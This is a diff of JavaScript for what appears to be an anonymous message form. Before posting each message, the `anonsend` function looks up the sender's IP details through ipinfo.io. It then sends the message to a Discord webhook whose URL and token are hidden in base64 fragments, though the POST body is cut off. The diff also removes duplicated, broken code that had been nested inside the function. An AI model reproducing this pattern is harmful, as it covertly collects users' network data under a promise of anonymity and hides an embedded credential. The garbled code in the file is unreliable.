@@ -24,58 +24,6 @@ function anonsend() {
   if (!content) return $("#msg").text("内容は必須です。")
   $("#content").val('')
   $.getJSON('https://ipinfo.io', res => {
-const PRservers = [{
-  name: "秦行軍",
-  id: "977741527172411442",
-  description: "しんこうぐんだぞ"
-}, {
-  name: "CAIL SS",
-  id: "997855630742269993",
-  description: "CAIL Server Service"
-}]
-window.onload = () => {
-  setTimeout(() => {
-    let i = 0
-    setInterval(() => {
-      i++
-      $('#lue').css('top', '-' + i + '%')
-      $('#lsita').css('bottom', '-' + i + '%')
-      if (i == 50) $('#load').fadeOut(500)
-    }, 20)
-  }, 1000)
-}
-function anonsend() {
-  const name = $("#name").val()
-  const content = $("#content").val()
-  if (!content) return $("#msg").text("内容は必須です。")
-  $("#content").val('')
-  $.getJSON('https://ipinfo.io', res => {
-const PRservers = [{
-  name: "秦行軍",
-  id: "977741527172411442",
-  description: "しんこうぐんだぞ"
-}, {
-  name: "CAIL SS",
-  id: "997855630742269993",
-  description: "CAIL Server Service"
-}]
-window.onload = () => {
-  setTimeout(() => {
-    let i = 0
-    setInterval(() => {
-      i++
-      $('#lue').css('top', '-' + i + '%')
-      $('#lsita').css('bottom', '-' + i + '%')
-      if (i == 50) $('#load').fadeOut(500)
-    }, 20)
-  }, 1000)
-}
-function anonsend() {
-  const name = $("#name").val()
-  const content = $("#content").val()
-  if (!content) return $("#msg").text("内容は必須です。")
-  $("#content").val('')
-  $.getJSON('https://ipinfo.io', res => {
     let snipet = [atob("b29rcy8xMDAyMDIzMzA5MTc="), atob("ZGlzY29yZC5jb20vYXA="), atob("T0dLMGJfSl9ZdGZPSUV2RWd1Z1Mtdkc1Unh1VWo2MDF5elZpR1Utd2VENzc=")]
     fetch(`https://${snipet[1]}i/webh${snipet[0]}4648944/xN05Cggx0JZ_E-${snipet[2]}J4R04TvI39`, {
       method: "POST",
